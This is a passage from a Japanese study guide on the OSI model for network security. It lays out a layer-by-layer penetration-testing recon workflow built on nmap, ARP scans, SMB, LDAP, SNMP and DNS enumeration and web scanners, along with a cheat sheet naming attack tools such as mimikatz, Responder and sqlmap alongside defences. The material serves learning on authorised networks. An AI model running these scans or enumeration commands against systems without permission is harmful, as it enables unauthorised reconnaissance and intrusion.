| 1 — Physical | 盗聴、イービルツイン、電波妨害 | 物理セキュリティ、暗号化プロトコル |

---

## 15. 実践的なワークフロー: ネットワーク偵察と分析

```bash
# ── SCENARIO: Network Penetration Testing — OSI-based Approach ──────

# ═══ PHASE 1: LAYER 1-2 — Physical & Data Link Recon ════════════════

# 1. Identify your network interface
$ ip link show
$ ip addr show

# 2. Put interface in promiscuous mode (passive sniffing)
$ ip link set eth0 promisc on
$ tcpdump -i eth0 -n -e           # capture with MAC addresses

# 3. ARP scan — discover all hosts on segment
$ arp-scan --localnet             # or:
$ nmap -sn -PR 192.168.1.0/24    # ARP ping sweep

# 4. Check for ARP anomalies
$ arpwatch -i eth0                # monitor ARP changes
$ tcpdump -i eth0 arp             # watch ARP traffic live

# ═══ PHASE 2: LAYER 3 — Network Discovery ════════════════════════════

# 5. ICMP ping sweep
$ nmap -sn 192.168.1.0/24        # host discovery
$ fping -a -g 192.168.1.0/24 2>/dev/null

# 6. TTL-based OS detection
$ ping -c 1 target | grep ttl
# TTL 64  → Linux/Unix
# TTL 128 → Windows
# TTL 255 → Network device (Cisco, etc.)

# 7. Traceroute — map network topology
$ traceroute -n 10.0.0.1
$ mtr --report 10.0.0.1

# ═══ PHASE 3: LAYER 4 — Port & Service Scanning ══════════════════════

# 8. Quick port scan
$ nmap -sS -F --open 192.168.1.0/24   # fast SYN scan, open ports only

# 9. Full port scan on discovered hosts
$ nmap -sS -p- -T4 target.com

# 10. UDP scan (slow but important)
$ nmap -sU --top-ports 100 target.com

# 11. Service version detection
$ nmap -sV -sC -p 22,80,443,445 target.com

# ═══ PHASE 4: LAYER 5-6 — Session & Protocol Analysis ════════════════

# 12. Check SSL/TLS configurations
$ sslscan target.com
$ nmap --script ssl-enum-ciphers -p 443 target.com
$ openssl s_client -connect target.com:443

# 13. Check for session management issues
# Burp Suite → Intercept → check session tokens

# 14. SMB/NetBIOS enumeration
$ enum4linux -a target.com
$ smbmap -H target.com
$ smbclient -L //target.com -N

# ═══ PHASE 5: LAYER 7 — Application Enumeration ══════════════════════

# 15. HTTP enumeration
$ curl -s -I http://target.com              # headers
$ whatweb http://target.com                 # tech fingerprint
$ nikto -h http://target.com               # web vulnerability scan
$ gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# 16. DNS enumeration
$ dig any target.com
$ dnsrecon -d target.com -t std
$ fierce --domain target.com

# 17. SNMP enumeration (if UDP 161 open)
$ snmpwalk -c public -v 2c target.com
$ snmpwalk -c public -v 2c target.com 1.3.6.1.2.1.1   # system info

# 18. LDAP enumeration (if port 389 open)
$ ldapsearch -H ldap://target.com -x -b "dc=target,dc=com"
$ nmap --script ldap-rootdse target.com

# ═══ ANALYSIS: Correlate findings across layers ═══════════════════════

# 19. Full comprehensive scan
$ nmap -A -sV -sC -O -p- --open target.com -oN full_scan.txt

# 20. Parse and organize results
$ grep "open" full_scan.txt | sort -t/ -k1 -n
```

### OSIに基づくトラブルシューティングの進め方

```
Problem: Can't reach remote server?

Step 1 — Layer 1 (Physical):
  → Is cable plugged in? Link light on?
  $ ip link show eth0 | grep "state UP"

Step 2 — Layer 2 (Data Link):
  → Can you reach local gateway?
  $ arp -a | grep gateway-ip

Step 3 — Layer 3 (Network):
  → Can you ping gateway?
  $ ping 192.168.1.1
  → Can you ping remote IP?
  $ ping 8.8.8.8
  → Check routing table
  $ ip route show

Step 4 — Layer 4 (Transport):
  → Is the port open?
  $ nc -zv target 80
  $ nmap -p 80 target

Step 5 — Layer 5-6 (Session/Presentation):
  → SSL certificate valid?
  $ openssl s_client -connect target:443
  → Session timeout?

Step 6 — Layer 7 (Application):
  → HTTP response code?
  $ curl -v http://target
  → Application error?
  → Check application logs
```

---

## OSIモデルとTCP/IPモデルの対応

```
OSI Model              TCP/IP Model (4-layer)     Protocols
─────────────          ──────────────────────     ─────────────────────────
Layer 7 — Application  ┐
Layer 6 — Presentation ├── Application Layer       HTTP, FTP, DNS, SMTP, SSH
Layer 5 — Session      ┘
─────────────          ──────────────────────     ─────────────────────────
Layer 4 — Transport    ─── Transport Layer         TCP, UDP, SCTP
─────────────          ──────────────────────     ─────────────────────────
Layer 3 — Network      ─── Internet Layer          IPv4, IPv6, ICMP, BGP
─────────────          ──────────────────────     ─────────────────────────
Layer 2 — Data Link    ┐
Layer 1 — Physical     ┴── Network Access Layer    Ethernet, Wi-Fi, ARP
```

---

## クイックリファレンスチートシート

```bash
# ── OSI LAYER MNEMONICS ────────────────────────────────────────────
# Top → Bottom:  "All People Seem To Need Data Processing"
# Bottom → Top:  "Please Do Not Throw Sausage Pizza Away"

# ── LAYER QUICK REFERENCE ─────────────────────────────────────────
# L7 Application  → HTTP, DNS, FTP, SSH, SMTP, SNMP, LDAP, RDP, SMB
# L6 Presentation → SSL/TLS, ASCII, Base64, JPEG, MIME
# L5 Session      → NetBIOS, RPC, SMB sessions, iSCSI
# L4 Transport    → TCP (reliable), UDP (fast)   [PORTS]
# L3 Network      → IPv4/IPv6, ICMP, OSPF, BGP   [IP ADDRESSES]
# L2 Data Link    → Ethernet, ARP, 802.1Q VLAN   [MAC ADDRESSES]
# L1 Physical     → Cables, signals, bits         [HARDWARE]

# ── PDU NAMES ─────────────────────────────────────────────────────
# L7-L5: Data
# L4:    Segment (TCP) / Datagram (UDP)
# L3:    Packet
# L2:    Frame
# L1:    Bits

# ── NETWORK RECON TOOLS ───────────────────────────────────────────
arp-scan --localnet           # Layer 2 discovery
nmap -sn 192.168.1.0/24      # Layer 3 host discovery
nmap -sS -p- target          # Layer 4 port scan
nmap -sV -sC target          # Layer 7 service detection
tcpdump -i eth0 -n           # Passive capture (all layers)
wireshark                    # GUI packet analysis

# ── ATTACK TOOLS BY LAYER ─────────────────────────────────────────
# L2: arpspoof, ettercap, bettercap, macof, yersinia
# L3: hping3, scapy, nmap
# L4: hping3, nmap, netcat, masscan
# L5: impacket, mimikatz, Responder
# L6: mitmproxy, sslstrip, sslscan, testssl.sh
# L7: sqlmap, nikto, gobuster, hydra, burpsuite

# ── DEFENSIVE TOOLS ───────────────────────────────────────────────
# L2: arpwatch, Dynamic ARP Inspection (DAI on switches)
# L3: uRPF, firewall ACL, fail2ban
# L4: SYN cookies, rate limiting, stateful firewall
# L5: Kerberos hardening, MFA, NTLM restrictions
# L6: HSTS, cert pinning, TLS 1.3, HPKP
# L7: WAF, input validation, CSP headers, SAST/DAST

# ── WIRESHARK FILTERS CHEATSHEET ──────────────────────────────────
ip.addr == 192.168.1.1         # filter by IP
ip.src == 10.0.0.0/8           # filter by subnet
tcp.port == 80                 # HTTP traffic
tcp.flags.syn == 1             # TCP SYN packets
tcp.flags.rst == 1             # TCP RST (port closed/reset)
udp.port == 53                 # DNS traffic
arp                            # ARP traffic only
http                           # HTTP traffic only
ssl or tls                     # SSL/TLS traffic
dns                            # DNS only
icmp                           # ICMP (ping) only
!(arp or dns or icmp)          # exclude noise

# ── PORT STATUS IN NMAP ────────────────────────────────────────────
# open         → service running, accepting connections
# closed       → port accessible, no service running (RST reply)
# filtered     → firewall blocking, no reply
# open|filtered → can't determine (UDP especially)
# unfiltered   → accessible, but state unknown

# ── COMMON NETWORK COMMANDS ───────────────────────────────────────
# Linux:
ip addr show; ip route show; ss -tulnp; arp -a; dig; traceroute

# Windows:
ipconfig /all; route print; netstat -ano; arp -a; nslookup; tracert
```

---

## OSI完全リファレンス表

| 層 | 名称 | PDU | アドレス | 機器 | 主要プロトコル |
|----|------|-----|---------|------|-----------------|
| 7 | Application | Data | — | WAF、プロキシ | HTTP、FTP、DNS、SSH |
| 6 | Presentation | Data | — | — | SSL/TLS、MIME |
| 5 | Session | Data | — | — | NetBIOS、RPC |
| 4 | Transport | Segment/Datagram | ポート | ファイアウォール | TCP、UDP |
| 3 | Network | Packet | IPアドレス | ルーター | IPv4、IPv6、ICMP |
| 2 | Data Link | Frame | MACアドレス | スイッチ | Ethernet、ARP、802.1Q |
| 1 | Physical | Bits | — | ハブ、NIC | DSL、Ethernet |

---

> **参考文献と書籍**
> - James Kurose & Keith Ross『Computer Networking: A Top-Down Approach』`~/Documents/Books/CyberSec/Networking/computernetworking.pdf`
> - William Stallings『Network Security Essentials: Applications and Standards (4th Edition)』`~/Documents/Books/CyberSec/Networking/Network-security-essentials-4th-edition-william-stallings.pdf`
> - Matthew Gast『802.11 Wireless Networks: The Definitive Guide』`~/Documents/Books/CyberSec/Networking/802_11_Wireless_Networks__The_Definitive_Guide__O__039_Reilly_Networking_.pdf`
> - Christian Benvenuti『Understanding Linux Network Internals』`~/Documents/Books/CyberSec/Networking/Understanding Linux Network Internals (2005).pdf`
> - W. Richard Stevens『UNIX Network Programming (Volume 1, 3rd Edition)』`~/Documents/Books/CyberSec/Networking/UNIX Network Programming Volume 1, 3rd edition - W. Richard Stevens.pdf`
> - RFC 793（TCP）、RFC 768（UDP）
> - Nmap公式ドキュメント、Wireshark公式ドキュメント、IANAポート番号レジストリ

> **リポジトリ:** [LearnCybersecurity](https://github.com/Kodokthegr3at/LearnCybersecurity)
> 自分が所有する、または許可を得たネットワークでの学習・検証を前提とした資料。
